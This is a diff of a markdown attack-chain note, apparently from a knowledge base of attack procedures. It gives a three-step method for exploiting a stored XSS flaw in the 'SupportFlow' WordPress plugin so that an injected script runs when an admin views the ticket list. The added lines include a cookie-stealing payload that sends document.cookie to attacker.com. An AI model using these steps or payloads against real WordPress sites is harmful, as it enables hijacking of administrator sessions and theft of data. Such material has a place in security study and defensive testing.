@@ -1,5 +1,4 @@
 ---
-id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
 tags:
   - xss
   - stored-xss
@@ -15,21 +14,22 @@ platforms:
   - WordPress
 submitted: true
 complexity: medium
-created_at: '2023-10-01T12:00:00Z'
+created_at: '2023-10-01T00:00:00Z'
 procedures:
   - '[[procedures/Embed-SupportFlow-Ticket-Submission-Form]]'
-  - '[[procedures/Submit-Ticket-with-XSS-Payload]]'
+  - '[[procedures/Inject-XSS-Payload-into-Ticket-Message]]'
   - '[[procedures/Trigger-XSS-in-Admin-Ticket-List]]'
 step_count: 3
 techniques:
   - '[[JavaScript]]'
-updated_at: '2025-12-14T03:16:08.126Z'
+updated_at: '2025-12-14T17:28:51.823Z'
 description: >-
   A multi-stage attack exploiting a stored XSS vulnerability in the SupportFlow
-  WordPress plugin by submitting malicious payloads in ticket messages, which
-  execute when viewed by administrators in the ticket list.
+  WordPress plugin by injecting malicious JavaScript into ticket messages, which
+  executes when admins view the tickets list.
 skill_level: intermediate
 impact_level: high
+id: 23091e69-4e1c-4185-8ed4-18b261d9c0de
 validated: true
 mitre_tactics:
   - '[[Execution]]'
@@ -55,9 +55,9 @@ Multi-stage attack chain demonstrating a complete attack workflow exploiting a s
 
 ```mermaid
 graph LR
-    A[Embed Form] --> B[Submit Payload]
-    B --> C[Trigger Execution]
-    C --> D[Admin Compromise]
+    A[Embed Ticket Form] --> B[Submit XSS Payload]
+    B --> C[Trigger in Admin View]
+    C --> D[Execute Malicious JS]
 
     style A fill:#e74c3c
     style B fill:#f39c12
@@ -69,69 +69,68 @@ graph LR
 
 ### Required Tools
 
-- WordPress admin or user access
-- Browser for form submission and admin navigation
+- Web browser (e.g., Chrome with developer tools for payload testing)
 
 ### Target Environment
 
 - WordPress site with SupportFlow plugin installed and active
-- Access to create pages and submit tickets as a logged-in user
-- Admin privileges to view ticket list (for exploitation phase)
+- Access to create/edit pages (contributor role or higher)
+- Logged-in user account (admin or editor role to bypass sanitization on submission)
 
 ### Initial Access Requirements
 
-- Valid user account on the WordPress site
-- No special network access beyond standard web connectivity
-- Plugin version vulnerable to unescaped ticket message output (e.g., pre-patch versions)
+- Valid WordPress credentials for a logged-in user
+- No special network access beyond standard HTTP/HTTPS to the site
+- Prior access to the frontend for page editing
 
 ## Detailed Attack Procedures
 
 ### Step 1: Embed Ticket Submission Form
 procedure: [[procedures/Embed-SupportFlow-Ticket-Submission-Form]]
 
-**Objective**: Insert the SupportFlow ticket submission form into a public or accessible WordPress page to enable payload submission.
+**Objective**: Create a page with the embedded SupportFlow ticket submission form to allow payload injection.
 
-**Instructions**: Log in to WordPress as a user, navigate to Pages > Add New, and insert the shortcode `[supportflow_submissionform]` into the page content using the editor. Publish the page to make the form available.
+**Instructions**: Log in to the WordPress dashboard, navigate to Pages > Add New, and insert the shortcode `[supportflow_submissionform]` into the page content using the Gutenberg editor or classic editor. Publish the page and access it via the frontend.
 
-**Expected Output**: A functional ticket submission form appears on the published page.
-
-**Success Indicators**:
-- Form renders correctly on the page
-- No errors in form display
-
-### Step 2: Submit Ticket with XSS Payload
-procedure: [[procedures/Submit-Ticket-with-XSS-Payload]]
-
-**Objective**: Inject a malicious JavaScript payload into a ticket message, which is stored without proper sanitization for output.
-
-**Instructions**: Visit the page with the embedded form, fill in required fields (e.g., subject, name), and enter the payload `<script>alert('XSS');</script>` in the message textarea. Submit the form while logged in.
-
-**Expected Output**: Ticket is submitted successfully, and a confirmation message appears.
+**Expected Output**: A functional ticket submission form displayed on the page.
 
 **Success Indicators**:
-- Ticket appears in the database (verifiable via admin if accessible)
-- No input validation errors block submission
+- Form fields (e.g., message textarea) are visible and interactive
+- No errors on page load
+
+### Step 2: Inject XSS Payload into Ticket Message
+procedure: [[procedures/Inject-XSS-Payload-into-Ticket-Message]]
+
+**Objective**: Submit a ticket containing an unescaped JavaScript payload that will be stored and later displayed to admins.
+
+**Instructions**: While logged in with admin or editor privileges, visit the embedded form page, fill in required fields, and enter the XSS payload `<script>alert('XSS');</script>` (or a more malicious one like `<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>`) in the message textarea. Submit the form.
+
+**Expected Output**: Ticket submission confirmation; payload stored without sanitization due to role privileges.
+
+**Success Indicators**:
+- Ticket appears in the admin tickets list without visible alterations to the payload
+- No client-side validation errors during submission
 
 ### Step 3: Trigger XSS in Admin Ticket List
 procedure: [[procedures/Trigger-XSS-in-Admin-Ticket-List]]
 
-**Objective**: Cause the stored payload to execute by rendering the ticket list in the admin interface, leading to arbitrary JavaScript execution in the admin's browser.
+**Objective**: View the tickets list as an admin to execute the stored payload in the browser context.
 
-**Instructions**: As an admin or editor, log in to WordPress and navigate to `/wp-admin/edit.php?post_type=sf_ticket`. The ticket message will be displayed unescaped in the table, triggering the payload.
+**Instructions**: Log in as an admin (or have an admin visit), navigate to `/wp-admin/edit.php?post_type=sf_ticket`. The unescaped message in the table will render the script tag, executing the JavaScript.
 
-**Expected Output**: JavaScript alert or other payload effects execute in the browser.
+**Expected Output**: Alert box or malicious action (e.g., cookie exfiltration) triggers in the admin's browser.
 
 **Success Indicators**:
-- Alert box or payload action triggers
-- Potential for further exploitation like session hijacking
+- JavaScript executes (e.g., alert pops up)
+- Browser console shows script execution errors or network requests to attacker server
 
 ## Attack Chain Summary
 
 ### Key Achievements
 
-1. Successful embedding and payload submission without detection
-2. Storage of unescaped malicious script in ticket data
-3. Execution of JavaScript in high-privilege admin context, enabling data theft or escalation
+1. Successful embedding of the vulnerable form without detection
+2. Injection of arbitrary JavaScript bypassing role-based sanitization
+3. Execution of payload in admin context, enabling session hijacking or data theft
 
 ## Technique & Tactic Coverage
 
@@ -144,4 +143,4 @@ procedure: [[procedures/Trigger-XSS-in-Admin-Ticket-List]]
 - [[Execution]]
 
 ---
-*Last updated: 2023-10-01T12:00:00Z*
+*Last updated: 2023-10-01T00:00:00Z*
